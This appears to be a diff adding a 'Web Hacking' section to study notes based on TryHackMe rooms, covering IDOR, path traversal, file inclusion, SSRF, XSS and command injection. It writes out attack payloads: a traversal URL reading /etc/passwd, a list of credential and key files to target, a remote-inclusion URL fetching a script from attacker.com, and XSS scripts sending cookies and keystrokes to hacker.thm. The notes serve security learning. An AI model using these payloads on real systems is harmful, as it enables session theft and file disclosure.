@@ -296,3 +296,176 @@ Secure Shell (SSH) was created to provide a secure way for remote system adminis
 | Telnet / N/A | 23 / N/A | Remote Access |
 | SSH | 22 | Secure Remote Access |
 | SFTP | 22 | Secure File Transfer |
+
+source: [https://tryhackme.com/room/protocolsandservers](https://tryhackme.com/room/protocolsandservers), [https://tryhackme.com/room/protocolsandservers2](https://tryhackme.com/room/protocolsandservers2)
+
+---
+
+# Web Hacking
+
+## IDOR
+
+IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
+
+This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
+
+## File Inclusion
+
+In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. 
+
+File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. 
+
+The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.
+
+### Path Traversal
+
+Also known as **Directory Traversal**, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.
+
+Basic example: `http://webapp.thm/get.php?file=../../../../etc/passwd`
+
+Common OS files useful to look for:
+
+| Location | Description |
+| --- | --- |
+| /etc/issue | contains a message or system identification to be printed before the login prompt. |
+| /etc/profile | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
+| /proc/version | specifies the version of the Linux kernel |
+| /etc/passwd | has all registered user that has access to a system |
+| /etc/shadow | contains information about the system's users' passwords |
+| /root/.bash_history | contains the history commands for root user |
+| /var/log/dmessage | contains global system messages, including the messages that are logged during system startup |
+| /var/mail/root | all emails for root user |
+| /root/.ssh/id_rsa | Private SSH keys for a root or any known valid user on the server |
+| /var/log/apache2/access.log | the accessed requests for Apache webserver |
+| C:\boot.ini | contains the boot options for computers with BIOS firmware |
+
+### Local File Inclusion
+
+LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.
+
+In this section, we will walk you through various LFI scenarios and how to exploit them.
+
+**1.** Suppose the web application provides two languages, and the user can select between the EN and AR
+
+```php
+<?PHP
+	include($_GET["lang"]);
+?>
+```
+
+The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.
+
+1. Next, In the following code, the developer decided to specify the directory inside the function.
+
+```php
+<?PHP
+	include("languages/". $_GET['lang']);
+?>
+```
+
+In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.
+
+If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.
+
+Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page.
+
+```
+http://webapp.thm/index.php?lang=../../../../etc/passwd%00
+```
+
+Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.
+
+NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
+
+### Remote File Inclusion
+
+Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly 
+sanitizing user input, allowing an attacker to inject an external URL 
+into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.
+
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an 
+attacker to gain Remote Command Execution (RCE) on the server.
+
+```
+http://webapp.thm/index.php?file=http://attacker.com/evil.sh
+```
+
+## Server-Side Request Forgery
+
+Server-Side Request Forgery (SSRF) it's a vulnerability that 
+allows a malicious user to cause the webserver to make an additional or 
+edited HTTP request to the resource of the attacker's choosing.
+
+There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.
+
+A successful SSRF attack can result in any of the following:
+
+- Access to unauthorised areas.
+- Access to customer/organisational data.
+- Ability to Scale to internal networks.
+- Reveal authentication tokens/credentials.
+
+Potential SSRF vulnerabilities can be spotted in web applications in 
+many different ways. Here is an example of four common places to look:
+
+1. When a full URL is used in a parameter in the address bar
+
+```
+http://website.com/form?server=http://api.website.com
+```
+
+1. A hidden field in a form
+2. A partial URL such as just the hostname
+
+```
+http://website.com/form?server=api
+```
+
+1. Or perhaps only the path of the URL
+
+```
+http://website.com/form?server=/my/resource
+```
+
+## Cross-site Scripting
+
+Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.
+
+**Proof Of Concept:**
+
+This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
+
+`<script>alert('XSS');</script>`
+
+**Session Stealing:**
+
+Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
+
+`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
+
+**Key Logger:**
+
+The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on 
+accepted user logins or credit card details.
+
+`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
+
+**Business Logic:**
+
+This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:
+
+`<script>user.changeEmail('attacker@hacker.thm');</script>`
+
+Now that the email address for the account has changed, the attacker may perform a reset password attack.
+
+## Command Injection
+
+Command injection is the abuse of an application's behaviour to 
+execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named `joe` will execute commands under this `joe` user - and therefore obtain any permissions that `joe` has.
+
+A command injection vulnerability is also known as a "Remote Code 
+Execution" (RCE) because an attacker can trick the application into 
+executing a series of payloads that they provide, without direct access 
+to the machine itself (i.e. an interactive shell). The webserver will 
+process this code and execute it under the privileges and access 
+controls of the user who is running that application.
